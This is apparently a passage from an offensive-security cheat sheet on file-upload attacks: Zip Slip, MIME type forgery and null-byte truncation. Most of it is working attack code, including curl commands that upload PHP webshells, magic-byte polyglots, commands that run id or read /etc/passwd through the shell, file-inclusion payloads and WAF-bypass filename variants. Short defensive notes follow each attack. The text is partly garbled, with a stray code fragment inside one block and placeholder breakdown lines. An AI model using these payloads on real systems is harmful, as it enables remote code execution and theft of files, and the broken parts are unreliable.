- `# Create an archive containing a symbolic link` — primary command _command_
- `...` — 13 lines total _value_

**Filename encoding confusion**
> Bypass the path check during extraction by modifying the encoding of filenames inside the archive (UTF-8/GBK/backslash)
```
# Unicode filename confusion
import zipfile, io, struct

with zipfile.ZipFile('encoded.zip', 'w') as zf:
    # Use backslash (Windows path separator)
    zf.writestr('..\\..\\..\\tmp\\test.txt', 'security_check')

# Manually construct the zip (modify the central directory filename)
# Use UTF-8-encoded path traversal characters
with open('crafted.zip', 'rb') as f:
    data = bytearray(f.read())
    # Replace the encoded characters in the filename
    # ../ becomes the raw bytes of %2e%2e%2f
```
**Syntax breakdown:**
- `# Unicode filename confusion` — primary command _command_
- `...` — 11 lines total _value_

**Overview:** Zip Slip is a vulnerability that uses path traversal sequences (../) in the filenames within an archive (ZIP/TAR/JAR/WAR, etc.) to achieve arbitrary file writing. When the server automatically extracts a user-uploaded archive, if it does not perform path security checks on the filenames inside the archive, the malicious file will be extracted to a location outside the intended directory, and an attacker can overwrite critical configuration files or write a Webshell to achieve RCE.

**Vulnerability Principle:** When extracting a ZIP/TAR file, the server directly uses the filename recorded inside the archive as the extraction path, without validating whether the filename contains a ../ path traversal sequence, and without checking whether the extracted absolute path is still within the intended directory.

**Exploitation Method:** Exploitation flow: 1) identify the ZIP upload/extraction feature 2) determine the web root or critical directory path 3) construct a malicious ZIP containing path traversal filenames 4) upload the malicious ZIP to trigger extraction 5) access the written Webshell to verify RCE.

**Defensive Measures:** 1) before extraction, validate whether each file's target path is within the intended directory 2) use Path.normalize() to normalize the path and then check 3) reject filenames containing ../ 4) extract in a sandbox/temporary directory and then check 5) restrict the execution permissions of the extraction directory.

---

### MIME Type Bypass  `file-mime`
_Bypass the file upload type check by forging the MIME type (Content-Type) to upload a malicious executable file_
Subcategory: **MIME** · tags: `mime` `bypass`

**Prerequisites:**
- The target has a file upload feature
- The server only determines the file type via the Content-Type
- The target's allowed MIME types are known

**Attack Chain:**

**Probe the file type check mechanism**
> Determine the file type validation method used by the server through comparative testing
_platform: linux_
```
# Test different upload methods to determine the check point:

# 1. Normal upload (should succeed):
curl -F "file=@test.jpg;type=image/jpeg" "http://target.com/upload"

# 2. Modify the Content-Type (determine whether only the MIME is checked):
curl -F "file=@shell.php;type=image/jpeg" "http://target.com/upload"

# 3. Modify the extension (determine whether the extension is checked):
curl -F "file=@shell.jpg;type=application/x-php" "http://target.com/upload"

# 4. Modify only the file header (determine whether the Magic Bytes are checked):
# PHP starting with GIF89a:
printf "GIF89a<?php system($_GET['cmd']); ?>" > shell.gif
curl -F "file=@shell.gif;type=image/gif" "http://target.com/upload"
```
**Syntax breakdown:**
- `type=image/jpeg` — forge the Content-Type in the multipart request _value_
- `GIF89a` — the Magic Bytes file header of a GIF image _value_

**MIME type forgery to upload a Webshell**
> Use MIME forgery combined with various filename techniques to upload an executable file
_platform: linux_
```
# Forge the Content-Type of a PHP webshell as an image:
curl -X POST "http://target.com/upload"   -F "file=@shell.php;type=image/jpeg;filename=shell.php"

# If the server also checks the extension, use a double extension:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.jpg" "http://target.com/upload"
curl -F "file=@shell.php;type=image/png;filename=shell.jpg.php" "http://target.com/upload"

# Apache multi-extension parsing:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.abc" "http://target.com/upload"

# Nginx parsing vulnerability:
curl -F "file=@shell.jpg;type=image/jpeg" "http://target.com/upload"
curl "http://target.com/uploads/shell.jpg/.php"
```
**Syntax breakdown:**
- `filename=shell.php.jpg` — double extension bypass, some servers only check the last extension _value_
- `shell.php.abc` — Apache parses an unknown extension leftward to .php _value_
- `shell.jpg/.php` — Nginx/PHP-CGI parsing vulnerability path _value_

**Magic Bytes forgery**
> Add a legitimate Magic Bytes file header before the malicious file to bypass content checks
_platform: linux_
```
# Add various file headers before the PHP file:

# JPEG file header:
printf "\xFF\xD8\xFF\xE0\x00\x10JFIF" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# PNG file header:
printf "\x89PNG\r\n\x1a\n" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# GIF file header:
printf "GIF89a" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# BMP file header:
printf "BM" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# Upload:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php" "http://target.com/upload"
```
**Syntax breakdown:**
- `ÿØÿà` — the Magic Bytes signature of a JPEG file _value_
- `PNG` — the Magic Bytes signature of a PNG file _value_
- `GIF89a` — the file header of the GIF89a animation format _value_

**Verify the upload result**
> Confirm the uploaded file path and verify the Webshell is executable
```
# Confirm the file upload path:
curl -v "http://target.com/uploads/shell.php"

# Execute a command:
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# If it cannot be accessed directly, try other paths:
curl "http://target.com/upload/files/shell.php?cmd=id"
curl "http://target.com/static/uploads/shell.php?cmd=id"
curl "http://target.com/resources/shell.php?cmd=id"
```
**Syntax breakdown:**
- `?cmd=id` — pass a system command via a GET parameter _value_
- `cat+/etc/passwd` — a space in the URL is encoded as + _value_

**WAF/EDR Bypass Variants:**

**Polyglot file bypass**
> Create a Polyglot file that satisfies both the image format magic bytes and PHP parsing to bypass file type detection
```
# GIF+PHP Polyglot
GIF89a<?php echo "security_check"; ?>

# PNG+PHP Polyglot (inject using exiftool)
exiftool -Comment='<?php echo "security_check"; ?>' test.png
mv test.png test.php.png

# JPEG Polyglot
exiftool -DocumentName='<?php echo "security_check"; ?>' test.jpg

# BMP+PHP
python3 -c "import struct; open('poly.php.bmp','wb').write(b'BM'+struct.pack('<I',54)+b'\x00'*46+b'<?php echo \"security_check\"; ?>')"
```
**Syntax breakdown:**
- `# GIF+PHP Polyglot` — primary command _command_
- `...` — 9 lines total _value_

**Content-Type boundary manipulation**
> Bypass the WAF file type check via multiple Content-Type headers, boundary confusion, and MIME case differences
```
# Multiple Content-Type headers
POST /upload HTTP/1.1
Content-Type: image/jpeg
Content-Type: application/x-php

# boundary confusion
Content-Type: multipart/form-data; boundary=abc; boundary=xyz

# Case-obfuscated MIME type
Content-Type: Image/JPEG
Content-Type: image/JPEG; charset=utf-8

# Add an extra parameter
Content-Type: image/jpeg; name="test.php"
```
**Syntax breakdown:**
- `# Multiple Content-Type headers` — primary command _command_
- `...` — 11 lines total _value_

**EXIF metadata payload injection**
> Inject the payload into the image's EXIF/XMP/ICC metadata fields, and execute the code combined with a file inclusion vulnerability
```
# EXIF Comment injection
exiftool -Comment='<?php system("id"); ?>' photo.jpg

# XMP metadata injection
exiftool -XMP-dc:Description='<script>alert(1)</script>' photo.jpg

# ICC Profile injection
exiftool -ICC_Profile:ProfileDescription='<?php echo "security_check"; ?>' photo.jpg

# Exploit combined with file inclusion after upload
# http://target/include.php?file=uploads/photo.jpg
```
**Syntax breakdown:**
- `<script>` — script tag _tag_
- `alert()` — popup function _function_
- `system()` — system command execution _function_

**Overview:** MIME type forgery is one of the most common file upload bypass techniques. When the server relies only on the Content-Type field in the HTTP request to determine the file type, an attacker can forge the Content-Type of a malicious file (such as a PHP webshell) as an allowed type (such as image/jpeg), making it pass the type check and be saved on the server.

**Vulnerability Principle:** The server determines the file type only via the HTTP request's Content-Type header or the file's Magic Bytes, without performing a deep check on the file content (such as actually parsing the image), and without restricting the script execution permissions of the upload directory.

**Exploitation Method:** Exploitation flow: 1) upload a normal file and observe the behavior 2) modify the Content-Type to test whether it bypasses 3) combine with Magic Bytes file header forgery 4) exploit web server parsing vulnerabilities (double extension/Nginx parsing) 5) locate the upload path and access the Webshell.

**Defensive Measures:** 1) do not trust the Content-Type, use file content detection (such as imagemagick to validate the image) 2) restrict file extensions with an allowlist 3) rename the uploaded file (use a UUID) 4) prohibit script execution in the upload directory 5) separate file storage from the web service.

---

### Null Byte Truncation  `file-null-byte`
_Use a null byte (%00/\x00) to truncate the extension validation of the filename, bypassing the file upload allowlist restriction_
Subcategory: **Null Byte** · tags: `null-byte` `bypass`

**Prerequisites:**
- The target uses allowlist validation of the file extension
- The backend language or library is affected by null byte truncation (PHP<5.3.4, older Java versions)
- The server has a truncation point during path concatenation

**Attack Chain:**

**Null byte truncation principle and environment detection**
> Detect whether the target environment may be affected by null byte truncation
```
# Environments affected by null byte truncation:
# - PHP < 5.3.4 (the underlying C functions treat \x00 as the string terminator),
        syntaxBreakdown: [
          { part: '<script>', explanation: { zh: 'Script tag', en: 'Scripttag' }, type: 'tag' },
          { part: 'alert()', explanation: { zh: 'Popup function', en: 'Alert function' }, type: 'function' }
        ]
# - The File class in older Java versions
# - Some Python 2.x versions
# - Programs using C/C++ extensions

# Detect the PHP version:
curl -sI "http://target.com/" | grep -i "x-powered-by|server"
curl -s "http://target.com/phpinfo.php" | grep -i "php version"
```

**File upload null byte truncation**
> Inject a null byte into the filename to truncate the extension validation
```
# Method 1: URL-encoded null byte:
curl -F "file=@shell.php;filename=shell.php%00.jpg" "http://target.com/upload"

# Method 2: modify the raw bytes in Burp:
# Replace [0x00] in the filename shell.php[0x00].jpg with an actual null byte
# Burp Repeater → select %00 → right-click → Convert → URL decode

# Method 3: send with Python:
import requests
files = {"file": ("shell.php\x00.jpg", open("shell.php","rb"), "image/jpeg")}
r = requests.post("http://target.com/upload", files=files)
print(r.status_code, r.text[:200])
```
**Syntax breakdown:**
- `shell.php%00.jpg` — the .jpg after the null byte passes the allowlist check, but is truncated to shell.php when saved _value_
- `\x00` — the null byte escape sequence in Python _value_

**File inclusion null byte truncation**
> Use a null byte to truncate the server-concatenated suffix in a file inclusion scenario
_platform: linux_
```
# Null byte truncation in PHP file inclusion:
# Server code: include($_GET["page"] . ".php");

# Normal request:
curl "http://target.com/index.php?page=about"   # → include("about.php")

# Null byte truncation:
curl "http://target.com/index.php?page=../../../etc/passwd%00"
# → include("../../../etc/passwd\x00.php")
# → actually reads ../../../etc/passwd (\x00 truncated .php)

# Combined with path traversal:
curl "http://target.com/index.php?page=../../../var/log/apache2/access.log%00"
curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config%00"
```
**Syntax breakdown:**
- `page=../../../etc/passwd%00` — the null byte truncates the trailing .php suffix _value_
- `include($_GET["page"].".php")` — the server code that forcibly concatenates the .php suffix _value_

**Modern alternatives (PHP>=5.3.4)**
> Alternative bypass methods when null byte truncation cannot be used in PHP 5.3.4+
```
# PHP 5.3.4+ has fixed null byte truncation, alternative methods:

# 1. Path truncation (overlong path):
# Windows MAX_PATH=260, Linux PATH_MAX=4096
payload="shell.php" + "/./" * 2048 + ".jpg"
curl "http://target.com/upload" -F "file=@shell.php;filename=$payload"

# 2. Dot truncation (Windows):
# Windows ignores trailing dots and spaces in the filename
curl -F "file=@shell.php;filename=shell.php." "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php " "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php::$DATA" "http://target.com/upload"

# 3. Case bypass:
curl -F "file=@shell.pHP;type=image/jpeg" "http://target.com/upload"
```
**Syntax breakdown:**
- `shell.php.` — Windows ignores the trailing dot, saves as shell.php _value_
- `::$DATA` — NTFS alternate data stream, a Windows feature bypass _value_
- `/./` — path truncation: an overlong path causes the suffix to be truncated _value_

**WAF/EDR Bypass Variants:**

**Path length truncation**
> Use the filesystem's maximum path length limit; an overlong path causes the suffix to be truncated
```
# PHP path length truncation (PHP < 5.3, over 4096 characters)
../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.

# Overlong extension truncation
test.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# Dot truncation (Windows MAX_PATH=260)
test.php...........................................................................
```
**Syntax breakdown:**
- `# PHP path length truncation (PHP < 5.3, over 4096 characters)` — primary command _command_
- `...` — 6 lines total _value_

**Windows special filename tricks**
> Bypass extension detection by exploiting Windows NTFS filesystem features (ADS streams/short filenames/special character handling)
```
# Dot-space-dot truncation (Windows NTFS)
test.php. . . .
test.php::$DATA
test.php::$DATA.jpg

# ADS stream to hide the extension
test.php::$INDEX_ALLOCATION
test.asp;.jpg
test.asp%00.jpg

# Windows short filename (8.3 format)
TESTPH~1.PHP
SHELL~1.PHP
```
**Syntax breakdown:**
- `# Dot-space-dot truncation (Windows NTFS)` — primary command _command_
- `...` — 11 lines total _value_

**Alternative null byte representations**
> Use different encoding methods to represent the null byte or terminator, bypassing the WAF's detection rules for %00
```
# Null bytes in different encodings
test.php%00.jpg
test.php\x00.jpg
test.php\0.jpg
test.php\u0000.jpg

# URL encoding variants
test.php%2500.jpg   # double-encoded null byte
test.php%u0000.jpg  # UTF-16 null byte

# Special terminators
test.php%0d.jpg     # carriage return
test.php%0a.jpg     # newline
test.php%1a.jpg     # EOF marker
```
**Syntax breakdown:**
- `# Null bytes in different encodings` — primary command _command_
- `...` — 12 lines total _value_

**Overview:** Null Byte Injection exploits the feature of the C language using \x00 as the string terminator. When the backend language (such as PHP<5.3.4) uses C functions to process file paths at the underlying level, an attacker injecting %00 into the filename can truncate the following characters, thereby bypassing the file extension validation. Although modern languages have fixed this problem, it is still effective in old systems.

**Vulnerability Principle:** During file path processing, the backend language first performs string operations at the high-level language layer (such as concatenating the .php suffix, checking the extension allowlist), then passes the result to the low-level C function to open the file. The C function stops reading when it encounters \x00, causing the high-level language's security check to be bypassed.

**Exploitation Method:** Exploitation flow: 1) detect the target PHP/Java version 2) inject %00 into the filename 3) the allowlist check only sees the .jpg after %00 4) when actually saving/including, %00 truncates to .php 5) access to verify.

**Defensive Measures:** 1) upgrade to PHP 5.3.4+/latest version 2) filter the \x00 character before path operations 3) use allowlist + rename (UUID) 4) do not use user input to directly concatenate the path 5) prohibit script execution in the upload directory.

---
